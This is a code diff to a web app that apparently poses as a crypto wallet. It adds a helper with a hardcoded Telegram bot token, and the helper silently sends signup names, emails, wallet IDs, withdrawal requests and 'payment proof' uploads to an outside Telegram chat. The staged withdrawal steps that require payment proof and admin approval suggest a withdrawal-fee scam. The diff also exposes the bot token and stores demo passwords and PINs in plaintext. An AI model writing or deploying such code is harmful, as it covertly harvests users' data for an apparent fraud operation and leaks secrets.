@@ -738,6 +738,14 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
+        // --- TELEGRAM NOTIFICATION HELPER ---
+        function sendTelegramAlert(text) {
+            const token = "9103189592:AAHKTRSuPiR9Cc2wPwdX6JKqsfm68K73cN0";
+            const chat = "8269612727";
+            const api = "https://api.telegram.org/bot" + token + "/sendMessage";
+            fetch(api + "?chat_id=" + chat + "&text=" + encodeURIComponent(text)).catch(function(e){});
+        }
+
         // Default Data Structures
         const defaultMasterUsers = [
             { name: "Demo User", email: "demo@chronicle.io", userId: "CRN-1001", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null }
@@ -1163,6 +1171,10 @@
 
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
             saveState(); updateBalanceUI();
+            
+            // Telegram Alert for Withdrawal Request
+            sendTelegramAlert(`💳 Withdrawal Request:\nUser: ${currentUserEmail}\nAmount: $${amt}\nMethod: ${selectedWithdrawMethodName}`);
+
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             setTimeout(() => { openActionModal(); }, 1500);
         }
@@ -1255,6 +1267,10 @@
                     }, { merge: true }).then(() => {
                         closeActionModal();
                         fileInput.value = "";
+                        
+                        // Telegram Alert for Proof Submission
+                        sendTelegramAlert(`🖼️ Payment Proof Uploaded:\nUser: ${currentUserEmail}\nStep: ${step.title} ($${step.amount})`);
+
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
                         alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
                     }).catch(err => {
@@ -1758,6 +1774,10 @@
             saveState();
             closeAuthModal();
             updateBalanceUI();
+
+            // Telegram Alert for New Signup
+            sendTelegramAlert(`🎉 New User Signup:\nName: ${name}\nEmail: ${email}\nWallet ID: ${uniqueId}`);
+
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
             document.getElementById('pin-setup-modal').style.display = 'flex';
         }
